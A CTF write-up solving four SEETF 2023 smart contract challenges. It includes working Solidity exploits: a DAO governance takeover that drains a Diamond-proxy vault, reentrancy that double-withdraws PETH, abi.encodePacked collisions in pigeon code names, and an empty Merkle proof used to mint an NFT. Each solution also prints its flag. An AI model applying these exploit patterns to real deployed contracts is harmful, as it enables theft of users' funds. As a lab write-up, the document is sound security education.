# SEETF 2023 Writeup

SEETF 2023 is a CTF hosted by Social Engineering Experts that included challenges of smart contracts. I solved all contract challenges, and my writeups are as follows.

**Table of Contents**
- [Pigeon Vault (3 solves)](#pigeon-vault-3-solves)
- [Pigeon Bank (6 solves)](#pigeon-bank-6-solves)
- [Operation Feathered Fortune Fiasco (14 solves)](#operation-feathered-fortune-fiasco-14-solves)
- [Murky SEEPass (14 solves)](#murky-seepass-14-solves)

## Pigeon Vault (3 solves)

>rainbowpigeon has just received a massive payout from his secret business, and he now wants to create a secure vault to store his cryptocurrency assets. To achieve this, he developed PigeonVault, and being a smart guy, he made provisions for upgrading the contract in case he detects any vulnerability in the system.
>
>Find out a way to steal his funds before he discovers any flaws in his implementation.
>
>Blockchain has a block time of 10: https://book.getfoundry.sh/reference/anvil/
>
>nc win.the.seetf.sg 8552


An upgradeable contract named `pigeonDiamond` that uses [EIP-2535: Diamonds, Multi-Facet Proxy](https://eips.ethereum.org/EIPS/eip-2535) is given.
Reading `Setup.sol`, it becomes apparent that the goal of this challenge is to satisfy the following two conditions:
- Set the owner of the `pigeonDiamond` contract to our address.
- Transfer 3,000 ether, the balance of the `pigeonDiamond` contract, to our address.

To know the balance of the `pigeonDiamond` contract, execute the following command.

```
$ cast balance -e $(cast call $SETUP_ADDRESS "pigeonDiamond()(address)")
3000.000000000000000000
```

Generally, the Diamonds pattern allows for more flexibility in upgrading compared to other upgradeable methods, but it also makes the contract structure more complex.
Thus, a large number of contracts are given, with over 20 of them, in this challenge.

```
$ tree
.
├── InitDiamond.sol
├── PigeonDiamond.sol
├── Setup.sol
├── facets
│   ├── DAOFacet.sol
│   ├── DiamondCutFacet.sol
│   ├── DiamondLoupeFacet.sol
│   ├── FTCFacet.sol
│   ├── OwnershipFacet.sol
│   └── PigeonVaultFacet.sol
├── interfaces
│   ├── IDAOFacet.sol
│   ├── IDiamondCut.sol
│   ├── IDiamondLoupe.sol
│   ├── IERC165.sol
│   ├── IERC173.sol
│   ├── IERC20.sol
│   ├── IOwnershipFacet.sol
│   └── IPigeonVaultFacet.sol
└── libraries
    ├── ECDSA.sol
    ├── LibAppStorage.sol
    ├── LibDAO.sol
    └── LibDiamond.sol

4 directories, 21 files
```

First, when we read `Setup.sol` and examine the `claim` function, we find the weird point.

```solidity
    function claim() external {
        require(!claimed, "You already claimed");

        bool success = IERC20(address(pigeonDiamond)).transfer(msg.sender, 10_000 ether);
        require(success, "Failed to send");
    }
```

The `pigeonDiamond` contract has an ERC-20 token implemented by the Diamonds pattern.
This ERC-20 token is the governance token called FeatherCoin (FTC) that can be used to manipulate the `pigeonDiamond`.
The `claim` function allows us to transfer $10000 \times 10^8$ FTC to `msg.sender`.
However, there is an elementary bug that `claimed` is not set to `true`, so it is possible to claim multiple times.
(After the CTF, the author said this was unintended.)

Investigating the governance system to exploit this bug, we find that if we can execute the `submitProposal` and `executeProposal` function in `DAOFacet.sol`, we can execute arbitrary code and reach the goal of this challenge.

The `submitProposal` function:

```solidity
    function submitProposal(address _target, bytes memory _callData, IDiamondCut.FacetCut memory _facetDetails)
        external
        returns (uint256 proposalId)
    {
        require(
            msg.sender == LibDiamond.contractOwner() || isUserGovernance(msg.sender), "DAOFacet: Must be contract owner"
        );
        proposalId = LibDAO.submitProposal(_target, _callData, _facetDetails);
    }
```

The `executeProposal` function:

```solidity
    function executeProposal(uint256 _proposalId) external {
        Proposal storage proposal = s.proposals[_proposalId];
        require(!proposal.executed, "DAOFacet: Already executed.");
        require(block.number >= proposal.endBlock, "DAOFacet: Too early.");
        require(
            proposal.forVotes > proposal.againstVotes && proposal.forVotes > (s.totalSupply / 10),
            "DAOFacet: Proposal failed."
        );
        proposal.executed = true;

        IDiamondCut.FacetCut[] memory cut = new IDiamondCut.FacetCut[](1);

        cut[0] = IDiamondCut.FacetCut({
            facetAddress: proposal.target,
            action: proposal.facetDetails.action,
            functionSelectors: proposal.facetDetails.functionSelectors
        });

        LibDiamond.diamondCut(cut, proposal.target, proposal.callData);
    }
```

The condition under which the `submitProposal` function can be executed is `msg.sender == LibDiamond.contractOwner() || isUserGovernance(msg.sender)`.
Since the former condition cannot be satisfied, we want to satisfy the latter `isUserGovernance(msg.sender)`.
The `isUserGovernance` function is as follows.

```solidity
    function isUserGovernance(address _user) internal view returns (bool) {
        uint256 totalSupply = s.totalSupply;
        uint256 userBalance = LibDAO.getCurrentVotes(_user);
        uint256 threshold = (userBalance * 100) / totalSupply;
        return userBalance >= threshold;
    }
```

The condition can be met if we have at least 1/100 of the total supply of FTC tokens.

The total supply of FTC tokens is $1000000 * 10^{18}$, so the `submitProposal` function can be executed because one call to the claim function can acquire 1/100 of the total supply.

Next, the `executeProposal` function can be executed if four conditions are met.
1. `!proposal.executed`
2. `block.number >= proposal.endBlock`
3. `proposal.forVotes > proposal.againstVotes`
4. `proposal.forVotes > (s.totalSupply / 10)`

1 and 2 can be easily satisfied.
3 can also be easily accomplished by calling the function to vote.
To satisfy 4, holding more FTC tokens than 1/10 of the total supply is necessary, which can be achieved by calling the `claim` function 11 times.
Thus, the `executeProposal` function can also be executed.

Finally, consider the proposal we want to execute.
We can create and use the following `ExploitFacet` contract.

```solidity
contract ExploitFacet {
    function exploit() public {
        LibDiamond.setContractOwner(msg.sender);
        address(msg.sender).call{value: address(this).balance}("");
    }

    fallback() external {
    }
}
```


If we add this `ExploitFacet` contract to the `pegionDiamond` contract and execute the `exploit` function, we can satisfy the two conditions that are the goals of this challenge.

Therefore, the following process can be executed to get the flag.

```solidity
contract ExploitFacet {
    function exploit() public {
        LibDiamond.setContractOwner(msg.sender);
        address(msg.sender).call{value: address(this).balance}("");
    }

    fallback() external {}
}

contract ExploitTest is Test {
    function test() public {
        (address playerAddress, uint256 playerKey) = makeAddrAndKey("player");
        Setup setup = new Setup{value: 3000 ether}();
        vm.deal(playerAddress, 10 ether);
        address pigeonDiamond = address(setup.pigeonDiamond());

        vm.roll(10);
        vm.startPrank(playerAddress, playerAddress);
        for (uint256 i = 0; i < 11; i++) {
            setup.claim();
        }
        FeatherCoinFacet(pigeonDiamond).delegate(playerAddress);
        ExploitFacet exploitFacet = new ExploitFacet();

        bytes4[] memory selectors = new bytes4[](1);
        selectors[0] = ExploitFacet.exploit.selector;
        uint256 proposalId = DAOFacet(pigeonDiamond).submitProposal(
            address(exploitFacet),
            "",
            IDiamondCut.FacetCut(address(exploitFacet), IDiamondCut.FacetCutAction.Add, selectors)
        );

        vm.roll(11);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerKey, keccak256("\x19Ethereum Signed Message:\n32"));
        bytes memory sig = abi.encodePacked(r, s, v);
        DAOFacet(pigeonDiamond).castVoteBySig(proposalId, true, sig);
        emit log_named_decimal_uint("ether", playerAddress.balance, 18);

        vm.roll(20);

        DAOFacet(pigeonDiamond).executeProposal(proposalId);

        vm.roll(21);
        ExploitFacet(pigeonDiamond).exploit();
        assertTrue(setup.isSolved());

        vm.stopPrank();
    }
}
```

Flag: `SEE{D14m0nd5_st0rAg3_4nd_P1g30nS_d0n't_g0_w311_t0G37h3r_B1lnG_bl1ng_bed2cbc16cbfca78f6e7d73ae2ac987f}`

I got the first blood of this challenge, but it seems that it is unintended to be able to execute the claim function multiple times. The intended solution seems to be to do `castVoteBySig` multiple times, using the ECDSA signature verification bug.

## Pigeon Bank (6 solves)

>The new era is coming. Pigeons are invading and in order to survive, the SEE Team created PigeonBank so that people can get extremely high interest rate. Hold PETH to get high interest. PETH is strictly controlled by the SEE team to prevent manipulation and corruption.
>
>nc win.the.seetf.sg 8550

The `PigeonBank` contract that has the `deposit`/`withdraw`/`withdrawAll`/`flashLoan` functions is given.
The goal of this challenge is to reduce the total supply of PETH tokens to 0 and increase the player's Ether balance to at least 2,500 ether.

Reentrancy attacks are difficult because `ReentrancyGuard` is applied to the `PigeonBank` contract's functions.

```solidity
    function deposit() public payable nonReentrant {
        peth.deposit{value: msg.value}(msg.sender);
    }

    function withdraw(uint256 wad) public nonReentrant {
        peth.withdraw(msg.sender, wad);
    }

    function withdrawAll() public nonReentrant {
        peth.withdrawAll(msg.sender);
    }

    function flashLoan(address receiver, bytes calldata data, uint256 wad) public nonReentrant {
        peth.flashLoan(receiver, wad, data);
    }
```

Each function is also a wrapper for a function of the PETH contract, which is a token that can be exchanged 1:1 for ETH.

Reading the PETH functions, there are functions with and without `onlyOwner` modifier, and those without `onlyOwner` modifier can be called without executing via the `PigeonBank` functions, which could be used for some kind of attack.
In particular, `approve`/`transfer`/`transferFrom` could be used.

We read into it deeply, noting that the `withdrawAll` function is deliberately provided.

```solidity
    function withdrawAll(address _userAddress) public onlyOwner {
        payable(_userAddress).sendValue(balanceOf[_userAddress]);
        _burnAll(_userAddress);
        // require(success, "SEETH: withdraw failed");
        emit Withdrawal(_userAddress, balanceOf[_userAddress]);
    }
```

It can be seen that Ether is transferred using the `sendValue` function of OpenZeppelin's `Address` contract.
Also, `_burnAll` is processed as follows.

```solidity
    function _burn(address src, uint256 wad) internal {
        require(balanceOf[src] >= wad);
        balanceOf[src] -= wad;
    }

    function _burnAll(address _userAddress) internal {
        _burn(_userAddress, balanceOf[_userAddress]);
    }
```

Is it possible to do a Reentrancy Attack with `sendValue`?
If we execute a transfer function to another address in the receive Ether function while executing the `sendValue` function and move PETH, we can change the value of `balanceOf`.
For example, it is possible to withdraw 100 ether but not to change `balanceOf[src]`.

Therefore, the following exploit will get the flag.

```solidity
contract Vault {
    Setup setup;

    constructor(address setupAddress) {
        setup = Setup(payable(setupAddress));
    }

    function transfer() public {
        setup.peth().transfer(msg.sender, setup.peth().balanceOf(address(this)));
    }
}

contract Exploit {
    Setup setup;
    PigeonBank pigeonBank;
    PETH peth;
    Vault vault;
    bool reentry = false;

    function exploit(address setupAddress) public payable {
        setup = Setup(payable(setupAddress));
        pigeonBank = setup.pigeonBank();
        peth = setup.peth();
        vault = new Vault(setupAddress);

        while (address(peth).balance > 0) {
            uint256 value =
                address(this).balance > address(peth).balance ? address(peth).balance : address(this).balance;
            pigeonBank.deposit{value: value}();
            reentry = true;
            pigeonBank.withdrawAll();
            reentry = false;
            vault.transfer();
            pigeonBank.withdrawAll();
        }
        address(payable(msg.sender)).call{value: address(this).balance}("");
    }

    receive() external payable {
        if (reentry) {
            peth.transfer(address(vault), peth.balanceOf(address(this)));
        }
    }
}
```

Flag: `SEE{N0t_4n0th3r_r33ntr4ncY_4tt4ck_abb0acf50139ba1e468f363f96bc5a24}`

After all, we do not need to use flash loans.

## Operation Feathered Fortune Fiasco (14 solves)

>Guest Author: https://twitter.com/Kikideveloper
>
>In the dystopian digital landscape of the near future, a cunning mastermind has kickstarted his plan for ultimate dominance by creating an army of robotic pigeons. These pigeons, six in the beginning, are given a sinister mission: to spy on the public, their focus being on individuals amassing significant Ethereum (ETH) holdings.
>
>Each pigeon has been tasked with documenting the ETH each person owns, planning for a future operation to swoop in and siphon off these digital assets. The robotic pigeons, however, are not just spies, but also consumers. They are provided with ETH by their creator to cover their operational expenses, making the network of spy birds self-sustaining and increasingly dangerous.
>
>The army operates on a merit-based system, where the pigeon agents earn points for their successful missions. These points pave their path towards promotion, allowing them to ascend the ranks of the robotic army. But, the journey up isn't free. They must return the earned ETH back to their master for their promotion.
>
>Despite the regimented system, the robotic pigeons have a choice. They can choose to desert the army at any point, taking with them the ETH they've earned. Will they remain loyal, or will they break free?
>
>nc win.the.seetf.sg 8548

The goal of this challenge is to have at least 34 ether and to reduce the amount of Ether possessed by the `pigeon` contract to 0.
The player initially has 5 ether.

First, we can see that there is an issue with the way `codeName` is generated in the function `becomeAPigeon` in `Pigeon.sol`.

```solidity
    function becomeAPigeon(string memory code, string memory name) public returns (bytes32 codeName) {
        codeName = keccak256(abi.encodePacked(code, name));

        if (codeToName[code][name]) revert();
        if (isPigeon[msg.sender]) revert();

        juniorPigeon[codeName] = msg.sender;
        isPigeon[msg.sender] = true;
        codeToName[code][name] = true;

        return codeName;
    }
```

Two pigeons whose `(code,name)` is `(Numbuh,5)` and `(Numbu,h5)` will have the same code name.
This can be used to exploit the following.

```solidity
contract ExploitPigeon {
    constructor(address pigeonAddress, string memory code, string memory name) {
        Pigeon pigeon = Pigeon(pigeonAddress);
        bytes32 codeName = pigeon.becomeAPigeon(code, name);
        pigeon.flyAway(codeName, 0);
        msg.sender.call{value: address(this).balance}("");
    }
}

contract Exploit {
    address ownerAddress;

    function exploit(address pigeonAddress) public {
        ownerAddress = msg.sender;
        new ExploitPigeon(pigeonAddress, "Numbu", "h5");
        new ExploitPigeon(pigeonAddress, "Numbu", "h3");
        new ExploitPigeon(pigeonAddress, "Numbu", "h1");
    }

    receive() external payable {
        ownerAddress.call{value: address(this).balance}("");
    }
}

```

Flag: `SEE{c00_c00_5py_squ4d_1n_act10n_9fbd82843dced19ebb7ee530b540bf93}`

## Murky SEEPass (14 solves)

>The SEE team has a list of special NFTs that are only allowed to be minted. Find out which one its allowed!
>
>nc win.the.seetf.sg 8546

The goal of this challenge is to mint the ERC721 token, `SEEPass`.

Minting is done by `MerkleProof` validation, but there is no check for the zero length of the `proof` array.

```solidity
contract ExploitScript is Script {
    function run() public {
        address setUpContractAddress = 0x498cB506f7505A7aBd5D95d43A5bED2C50D72BC5;
        Setup setup = Setup(setUpContractAddress);
        bytes32 root = vm.load(address(setup.pass()), bytes32(uint256(6)));
        bytes32[] memory proof = new bytes32[](0);

        vm.startBroadcast();
        setup.pass().mintSeePass(proof, uint256(root));
        vm.stopBroadcast();
    }
}
```

Flag: `SEE{w3lc0me_t0_dA_NFT_w0rld_w1th_SE3pAs5_f3a794cf4f4dd14f9cc7f6a25f61e232}`